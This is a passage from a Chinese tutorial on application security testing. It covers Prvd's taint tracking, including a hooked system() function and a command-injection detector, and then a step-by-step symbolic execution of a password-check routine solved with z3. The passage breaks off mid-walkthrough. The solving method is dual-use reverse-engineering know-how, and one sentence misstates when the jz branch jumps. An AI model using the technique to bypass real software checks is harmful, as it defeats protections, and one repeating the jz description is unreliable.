prvd_load_file(PRVD_ABSPATH.&quot;filter/*.php&quot;);
// 3. 加载 opcode
prvd_load_opcode(PRVD_ABSPATH.&quot;opcode/*.php&quot;);

</code></pre>
<p><code>prvd_xmark()</code> 函数则是调用xmark 拓展里面的函数给变量打标记.</p>
<pre><code class="language-php">
function prvd_xmark(&amp;$var, $recursive=true) {
    if (!PRVD_TAINT_ENABLE) return;
    if (is_string($var)) {
        xmark($var);
    } elseif (is_array($var) &amp;&amp; $recursive) {
        foreach ($var as $key =&gt; &amp;$value) {
            prvd_xmark($value, $recursive);
        }
    }
}

</code></pre>
<p>回到xmark.c 找到xmark() 函数声明,可以发现是通过给PHP 变量数据结构类型中的<code>type_info</code> 字段中做了标签记录(IS_XMARK_FLAG),这只适用于string 类型的PHP 变量.</p>
<pre><code class="language-c">
//  https://github.com/fate0/xmark/blob/34dd79d3e38dfb7f22c67eaedaa540a4cd88aee6/xmark.c#L1291

PHP_FUNCTION(xmark)  //  xmark.dll 导出函数
{
    zval *z_str;

    if (!XMARK_G(enable)) {
        RETURN_FALSE;
    }

    if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;z&quot;, &amp;z_str) == FAILURE) {
        return;
    }

    ZVAL_DEREF(z_str);
    if (IS_STRING != Z_TYPE_P(z_str) || Z_STRLEN_P(z_str) == 0) {  //  只给String 类型的变量打标记
        RETURN_FALSE;
    }

    if (xmark_zstr(z_str) == FAILURE) {
        RETURN_FALSE;
    }

    RETURN_TRUE;
}

//  https://github.com/fate0/xmark/blob/34dd79d3e38dfb7f22c67eaedaa540a4cd88aee6/xmark.c#L1124

static zend_always_inline int xmark_zstr(zval *z_str)  //  给变量打标记
{
    if (!XCHECK_FLAG(Z_STR_P(z_str))) {
        zend_string *str = zend_string_init(Z_STRVAL_P(z_str), Z_STRLEN_P(z_str), 0);  //  创建新字符串对象
        ZSTR_LEN(str) = Z_STRLEN_P(z_str);
        zend_string_release(Z_STR_P(z_str));
        XMARK_FLAG(str);
        ZVAL_STR(z_str, str);
    }

    return SUCCESS;
}

//  https://github.com/fate0/xmark/blob/34dd79d3e38dfb7f22c67eaedaa540a4cd88aee6/php_xmark.h#L41

#if PHP_VERSION_ID &lt; 70300
#   define IS_XMARK_FLAG            (1&lt;&lt;6)
#   define XMARK_FLAG(str)          (GC_FLAGS((str)) |= IS_XMARK_FLAG)
#   define XCLEAR_FLAG(str)         (GC_FLAGS((str)) &amp;= ~IS_XMARK_FLAG)
#   define XCHECK_FLAG(str)         (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)
#else
#   define EX_CONSTANT(op)          RT_CONSTANT(EX(opline), op)
#   define IS_XMARK_FLAG            (1&lt;&lt;5)
#   define XMARK_FLAG(str)          GC_ADD_FLAGS(str, IS_XMARK_FLAG)
#   define XCLEAR_FLAG(str)         GC_DEL_FLAGS(str, IS_XMARK_FLAG)
#   define XCHECK_FLAG(str)         (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)
#endif

//  https://github.com/php/php-src/blob/c4e4ef0498f691788e30e4cdfae3c3aa9dd3b1f1/Zend/zend_types.h#L516

static zend_always_inline uint32_t zval_gc_flags(uint32_t gc_type_info) {
  return (gc_type_info &gt;&gt; GC_FLAGS_SHIFT) &amp; (GC_FLAGS_MASK &gt;&gt; GC_FLAGS_SHIFT);
}

#define GC_TYPE_INFO(p)     (p)-&gt;gc.u.type_info
#define GC_FLAGS(p)         zval_gc_flags(GC_TYPE_INFO(p))

</code></pre>
<p>Entry.php 最后一部分就是引入检测规则,因为前面已经使用xmark 重命名了这些变量,那么接下来就需要以这些被重命名的函数进行重新声明,达到hook 的目的.</p>
<pre><code class="language-php">
// 1. 加载 sink
prvd_load_file(PRVD_ABSPATH.&quot;sink/*/*.php&quot;);  //  敏感函数
// 2. 加载 filter
prvd_load_file(PRVD_ABSPATH.&quot;filter/*.php&quot;);  //  过滤函数
// 3. 加载 opcode
prvd_load_opcode(PRVD_ABSPATH.&quot;opcode/*.php&quot;);  //  敏感Opcode

</code></pre>
<p><code>prvd_load_file()</code> 函数接下来不断把目录里面的规则文件require 进来.</p>
<pre><code class="language-php">
function prvd_load_file($pattern) {  //  加载策略文件函数
    $glob = prvd_get_function(&quot;glob&quot;);
    $ksort = prvd_get_function(&quot;ksort&quot;);
    $basename = prvd_get_function(&quot;basename&quot;);
    $file_list = $glob($pattern);
    $result_list = array();
    foreach ($file_list as $absfilename) {
        if (in_array($basename($absfilename), $result_list)) {
            prvd_log(&quot;error: function &quot;.$basename($absfilename).&quot; already exists in &quot;.$file_list[$basename($absfilename)]);
            continue;
        }
        $result_list[$basename($absfilename)] = $absfilename;
    }
    $ksort($result_list);
    foreach ($result_list as $filename =&gt; $absfilename) {
        $funcname = preg_replace(&quot;/\d{3}\-/&quot;, &quot;&quot;, $filename);
        $funcname = preg_replace(&quot;/.php$/&quot;, &quot;&quot;, $funcname);
        if (!function_exists(PRVD_RENAME_PREFIX.$funcname) &amp;&amp; !class_exists(PRVD_RENAME_PREFIX.$funcname)) {
            prvd_log(&quot;error: function/class &quot;.PRVD_RENAME_PREFIX.$funcname.&quot; not exists&quot;);
            continue;
        }
        if (function_exists($funcname) || class_exists($funcname)) {
            prvd_log(&quot;error: function/class &quot;.$funcname.&quot; already exists&quot;);
            continue;
        }
        require($absfilename);
    }
}

</code></pre>
<p>我们以<code>src/sink/rce/001-system.php</code> 举个例子,最后在重命名的<code>system()</code> 函数里面插入对函数参数的数据检测代码.</p>
<pre><code class="language-php">
&lt;?php
function system($command, &amp;$return_var = null) {
    prvd_check_rce($command, prvd_translate(&quot;Remote Command Execute&quot;));
    return call_user_func_array(PRVD_RENAME_PREFIX.&quot;system&quot;, array($command, &amp;$return_var));
}

</code></pre>
<p>漏洞检测方法如下:</p>
<pre><code class="language-php">
/**
 * 检测是否存在命令注入
 * @param $command
 * @param $message
 */
function prvd_check_rce(&amp;$command, $message) {
    global $prvd_sentry_client;
    if (!$prvd_sentry_client) return;
    if (prvd_detect_cmd_injection($command)) {
        $prvd_sentry_client-&gt;captureVuln($message);
    } else if (PRVD_TAINT_ENABLE &amp;&amp; prvd_xcheck($command)) {
        $prvd_sentry_client-&gt;captureVuln($message, &quot;debug&quot;);
    }
}

/**
 * 检测 CMD 语句是否异常
 * @param $cmd_string
 * @return bool
 */
function prvd_detect_cmd_injection($cmd_string) {
    // TODO: 目前只考虑了逃脱引号的情况，在双引号内的情况暂未支持
    $strlen = prvd_get_function('strlen');
    $stripos = prvd_get_function('stripos');
    $substr = prvd_get_function('substr');
    $in_array = prvd_get_function('in_array');
    $cur_pos = 0;
    $cmd_string_len = $strlen($cmd_string);
    while ($cur_pos &lt; $cmd_string_len) {
        while ($stripos(PRVD_WHITESPACE, $substr($cmd_string, $cur_pos, 1)) !== FALSE) $cur_pos++;
        if ($stripos('\'&quot;', $substr($cmd_string, $cur_pos, 1)) !== FALSE) {
            // handle literal
            $quote = $substr($cmd_string, $cur_pos, 1);
            $cur_pos ++;
            while ($cur_pos &lt; $cmd_string_len) {
                if ($quote === $substr($cmd_string, $cur_pos, 1))
                    break;
                elseif ($in_array($substr($cmd_string, $cur_pos, 2), array('\\\\', '\\\'', '\\&quot;')))
                    $cur_pos += 1;
                $cur_pos ++;
            }
            // broken cmd statement
            if ($cur_pos == $cmd_string_len) return TRUE;
            $cur_pos ++;
        } elseif ($stripos(PRVD_KEYWORD_ALLOW_CHARS, $substr($cmd_string, $cur_pos, 1)) === FALSE) {
            // handle op
            $cur_pos ++;
        } else {
            // handle keyword
            $keyword_start = $cur_pos;
            while ($cur_pos &lt; $cmd_string_len) {
                if ($stripos(PRVD_KEYWORD_ALLOW_CHARS, $substr($cmd_string, $cur_pos, 1)) === FALSE) break;
                $cur_pos ++;
            }
            if ($stripos($substr($cmd_string, $keyword_start, $cur_pos-$keyword_start),  PRVD_TANZI) !== FALSE)
                return TRUE;
        }
    }
    return FALSE;
}

</code></pre>
<p>关于Prvd 的污点追踪原理就介绍到此了,如有兴趣可以更深入去了解(Link : http://blog.fatezero.org/2018/11/11/prvd/ ).在部署好Prvd 之后,启用payload 模式,此时Prvd 会在$_GET $_POST 等中的数据插入一些攻击Payload ,然后由规则来匹配是否存在漏洞.对于这个步骤,测试者是不需要对HTTP 数据包(URL 中的输入位置,HTTP body ,HTTP Cookie )进行Payload 插入测试,测试者只需要根据页面进行常见的功能测试方法,然后Prvd 就会自行插入数据并且检测,这个也就是IAST (交互式安全测试)的原理.</p>
<h2 id="符号执行"><a class="header" href="#符号执行">符号执行</a></h2>
<p>符号执行是指把程序的语义抽象变成逻辑公式或代码路径公式,通过对这条公式进行求解并得出符合的条件.第六章的综合分析中提到,当我们在检测可控的输入是否能够通过某些特定的判断语句达到触发点,需要满足哪些条件并进行求解,这是静态符号执行.动态符号执行的原理是跟踪程序的执行,在某些特定的判断和数据运算的过程中可以知道具体的内容值(在静态符号执行中有时候不容易获取某一行代码或者汇编的值,所以需要跟踪到此获得该值,而且静态符号执行在对非常多的条件进行求解的时候会产生路径爆炸的问题,又需要考虑条件优化)然后构建逻辑公式进行路径/数据求解.我们先研究这段代码:</p>
<pre><code class="language-assembly">
mov eax, 1
add eax, 2
mov ebx, eax

</code></pre>
<p>对应到寄存器布局如下:</p>
<pre><code class="language-txt">
EAX : -1
EBX : -1
ECX : -1

</code></pre>
<p>然后我们模拟执行这段汇编代码并填写寄存器布局,过程如下:</p>
<pre><code class="language-txt">
(Round 1)

Code :

mov eax, 1     &lt;- Point
add eax, 2
mov ebx, eax

Symbolic Expression :

p0 = 1

Register Reference Table :

EAX : p0
EBX : -1
ECX : -1

----

(Round 2)

Code :

mov eax, 1
add eax, 2     &lt;- Point
mov ebx, eax

Symbolic Expression :

p0 = 1
p1 = add(p0,2)

Register Reference Table :

EAX : p1
EBX : -1
ECX : -1

----

(Round 3)

Code :

mov eax, 1
add eax, 2
mov ebx, eax   &lt;- Point

Symbolic Expression :

p0 = 1
p1 = add(p0,2)
p2 = p1

Register Reference Table :

EAX : p1
EBX : p2
ECX : -1

</code></pre>
<p>然后我们要求解EBX 寄存器的值,只需要把公式组装即可:</p>
<pre><code class="language-txt">
EBX = p2 , p2 = p1 = add(p0,2) = add(1,2) = 3

</code></pre>
<p>我们举一个对内存数据进行运算的例子</p>
<pre><code class="language-c">
char *serial = &quot;\x31\x3e\x3d\x26\x31&quot;;

int check_password(char *ptr)
{
  int i = 0;
  while (i &lt; 5){
    if (((ptr[i] - 1) ^ 0x55) != serial[i])
      return 1; /* bad password */
    i++;
  }
  return 0; /* good password */
}

</code></pre>
<p>对应的汇编如下:</p>
<pre><code class="language-assembly">
__text:0000000100000F20                 public _check_password
__text:0000000100000F20 _check_password proc near
__text:0000000100000F20
__text:0000000100000F20 var_14          = dword ptr -14h
__text:0000000100000F20 var_10          = qword ptr -10h
__text:0000000100000F20 var_4           = dword ptr -4
__text:0000000100000F20
__text:0000000100000F20                 push    rbp
__text:0000000100000F21                 mov     rbp, rsp
__text:0000000100000F24                 mov     [rbp+var_10], rdi
__text:0000000100000F28                 mov     [rbp+var_14], 0
__text:0000000100000F2F
__text:0000000100000F2F loc_100000F2F:                          ; CODE XREF: _check_password+57↓j
__text:0000000100000F2F                 cmp     [rbp+var_14], 5
__text:0000000100000F33                 jge     loc_100000F7C
__text:0000000100000F39                 mov     rax, [rbp+var_10]
__text:0000000100000F3D                 movsxd  rcx, [rbp+var_14]
__text:0000000100000F41                 movsx   edx, byte ptr [rax+rcx]
__text:0000000100000F45                 sub     edx, 1
__text:0000000100000F48                 xor     edx, 55h
__text:0000000100000F4B                 mov     rax, cs:_serial
__text:0000000100000F52                 movsxd  rcx, [rbp+var_14]
__text:0000000100000F56                 movsx   esi, byte ptr [rax+rcx]
__text:0000000100000F5A                 cmp     edx, esi
__text:0000000100000F5C                 jz      loc_100000F6E
__text:0000000100000F62                 mov     [rbp+var_4], 1
__text:0000000100000F69                 jmp     loc_100000F83
__text:0000000100000F6E ; ---------------------------------------------------------------------------
__text:0000000100000F6E
__text:0000000100000F6E loc_100000F6E:                          ; CODE XREF: _check_password+3C↑j
__text:0000000100000F6E                 mov     eax, [rbp+var_14]
__text:0000000100000F71                 add     eax, 1
__text:0000000100000F74                 mov     [rbp+var_14], eax
__text:0000000100000F77                 jmp     loc_100000F2F
__text:0000000100000F7C ; ---------------------------------------------------------------------------
__text:0000000100000F7C
__text:0000000100000F7C loc_100000F7C:                          ; CODE XREF: _check_password+13↑j
__text:0000000100000F7C                 mov     [rbp+var_4], 0
__text:0000000100000F83
__text:0000000100000F83 loc_100000F83:                          ; CODE XREF: _check_password+49↑j
__text:0000000100000F83                 mov     eax, [rbp+var_4]
__text:0000000100000F86                 pop     rbp
__text:0000000100000F87                 retn

</code></pre>
<p>我们知道,<code>_check_password()</code> 的字符串地址参数保存在rdi 寄存器中,然后<code>mov rax, [rbp+var_10]</code>和<code>movsx edx, byte ptr [rax+rcx]</code> 两句汇编从字符串缓冲区中读取字符出来,在<code>xor edx, 55h</code> 进行异或运算,最后使用<code>cmp edx, esi</code> 和程序中内置的字符串进行字符值判断,<code>jz loc_100000F6E</code> 的意思是如果两值不相等那就跳转到地址0x100000F83 ,不相等就执行到0x100000F6E 的jmp 指令跳转到0x100000F2F 处(这是for 循环结构).<code>_check_password()</code> 在校验异或过后的字符失败就会返回1 ,成功则返回0 .</p>
<p>理解这段汇编代码之后,我们就对代码进行一步一步的符号执行分析.我们先抽出最核心的运算代码:</p>
<pre><code class="language-assembly">
__text:0000000100000F39                 mov     rax, [rbp+var_10]
__text:0000000100000F3D                 movsxd  rcx, [rbp+var_14]
__text:0000000100000F41                 movsx   edx, byte ptr [rax+rcx]
__text:0000000100000F45                 sub     edx, 1
__text:0000000100000F48                 xor     edx, 55h
__text:0000000100000F4B                 mov     rax, cs:_serial
__text:0000000100000F52                 movsxd  rcx, [rbp+var_14]
__text:0000000100000F56                 movsx   esi, byte ptr [rax+rcx]
__text:0000000100000F5A                 cmp     edx, esi

</code></pre>
<p>然后对这段代码进行寄存器布局.</p>
<pre><code class="language-txt">
(Round 1)

Code :

mov     rax, [rbp+var_10]         &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10

Register Reference Table :

RAX : p0
RBX : -1
RCX : -1
RDX : -1
RSI : -1
RDI : -1

----

(Round 2)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14

Register Reference Table :

RAX : p0
RBX : -1
RCX : p1
RDX : -1
RSI : -1
RDI : -1

----

(Round 3)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]   &lt;- Point
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)

Register Reference Table :

RAX : p0
RBX : -1
RCX : p1
RDX : p2
RSI : -1
RDI : -1

----

(Round 4)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1                    &lt;- Point
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)

Register Reference Table :

RAX : p0
RBX : -1
RCX : p1
RDX : p3
RSI : -1
RDI : -1

----

(Round 5)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h                  &lt;- Point
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)

Register Reference Table :

RAX : p0
RBX : -1
RCX : p1
RDX : p4
RSI : -1
RDI : -1

----

(Round 6)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial           &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)
p5 = _serial

Register Reference Table :

RAX : p5
RBX : -1
RCX : p1
RDX : p4
RSI : -1
RDI : -1

----

(Round 7)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)
p5 = _serial
p6 = var_14

Register Reference Table :

RAX : p5
RBX : -1
RCX : p6
RDX : p4
RSI : -1
RDI : -1

----

(Round 8)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]   &lt;- Point
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)
p5 = _serial
p6 = var_14
p7 = *(add(p5,p6))

Register Reference Table :

RAX : p5
RBX : -1
RCX : p6
RDX : p4
RSI : p7
RDI : -1

----

(Round 9)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi                  &lt;- Point

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)
p5 = _serial
p6 = var_14
p7 = *(add(p5,p6))

Register Reference Table :

RAX : p5
RBX : -1
RCX : p6
RDX : p4
RSI : p7
RDI : -1

</code></pre>
<p>在执行到第九步时,指令<code>cmp edx, esi</code> 会把edx 和esi 的值进行对比,于是我们根据寄存器布局来构造求解公式:</p>
<pre><code class="language-txt">
RDX = p4 = xor(p3,0x55) = xor(sub(p2,1),0x55) = xor(sub(*(add(p0,p1),1),0x55)) = xor(sub(*(add(var_10,var_14),1),0x55))
RSI = p7 = *(add(p5,p6)) = *(add(_serial,var_14))

(RDX == RSI) =&gt; (xor(sub(*(add(var_10,var_14),1),0x55)) == *(add(_serial,var_14)))

</code></pre>
<p>在此先忽略<code>*(add(var_10,var_14)</code> 和<code>*(add(_serial,var_14)))</code> ,因为这是获取内存,后面再讨论.我们先假定一个未知值X (可控输入)和已知值(_serial 中的字符值)进行公式重组,约束如下.</p>
<pre><code class="language-txt">
(RDX == RSI) =&gt; (xor(sub(X,1),0x55) == 0x31)

</code></pre>
<p>用z3 求解方式的代码:</p>
<pre><code class="language-python">
from z3 import *


x = BitVec('x',8)
solver = Solver()

solver.add((x - 1) ^ 0x55 == 0x31)
solver.check()

print solver.model()

</code></pre>
<p>执行结果如下:</p>
<p><img src="pic7/pic3.png" alt="" /></p>
<p>在对寄存器求解的过程中,我们发现var_10,var_14,_serial 都是从内存中获取到的数据,但是具体数据是什么我们不得而知,所以还需要对进行内存布局,再进行求解</p>
<pre><code class="language-txt">
Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi                  &lt;- Point

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)
p5 = _serial
p6 = var_14
p7 = *(add(p5,p6))

Register Reference Table :

RAX : p5
RBX : -1
RCX : p6
RDX : p4
RSI : p7
RDI : -1

Memory Reference Table :

var_14         : 0  #  假定为0
var_10_buffer  : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]  #  未初始化为-1
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

</code></pre>
<p>对于var_10 的第一个结果,我们的求解思路如下:</p>
<pre><code class="language-txt">
(RDX == RSI) =&gt; (xor(sub(*(add(var_10,var_14),1),0x55)) == *(add(_serial,var_14))) =&gt; (xor(sub(var_10_buffer_0,1),0x55)) == _serial_buffer_0)) =&gt; (xor(sub(x0,1),0x55)) == 0x31

</code></pre>
<p>继续分析程序,汇编代码如下:</p>
<pre><code class="language-assembly">
mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

</code></pre>
<p>我们可以看到,rdi 是可控的输入,var_14 是0 ,然后继续进行分析:</p>
<pre><code class="language-txt">
(Round1)

Code :

mov     [rbp+var_10], rdi         &lt;- Point
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi

Register Reference Table :

RAX : -1
RBX : -1
RCX : -1
RDX : -1
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : -1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round2)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0           &lt;- Point
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0

Register Reference Table :

RAX : -1
RBX : -1
RCX : -1
RDX : -1
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round3)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]         &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0

Register Reference Table :

RAX : p2
RBX : -1
RCX : -1
RDX : -1
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round4)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1

Register Reference Table :

RAX : p2
RBX : -1
RCX : p3
RDX : -1
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round5)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]   &lt;- Point
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))

Register Reference Table :

RAX : p2
RBX : -1
RCX : p3
RDX : p4
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round6)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1                    &lt;- Point
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)

Register Reference Table :

RAX : p2
RBX : -1
RCX : p3
RDX : p5
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round7)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h                  &lt;- Point
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi
jz      loc_100000F6E
mov     [rbp+var_4], 1
jmp     loc_100000F83
mov     eax, [rbp+var_14]
add     eax, 1
mov     [rbp+var_14], eax
jmp     loc_100000F2F

Symbolic Expression :

p0 = rdi
p1 = 0
p2 = p0
p3 = p1
p4 = *(add(p2,p3))
p5 = sub(p4,1)
p6 = xor(p5,0x55)

Register Reference Table :

RAX : p2
RBX : -1
RCX : p3
RDX : p6
RSI : -1
RDI : (control)

Memory Reference Table :

var_14         : p1
var_10         : p0
input_buffer   : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]
_serial_buffer : [ 0x31 , 0x3E ,0x3D ,0x26 ,0x31 ]

----

(Round8)

Code :

mov     [rbp+var_10], rdi
mov     [rbp+var_14], 0
cmp     [rbp+var_14], 5
jge     loc_100000F7C
mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
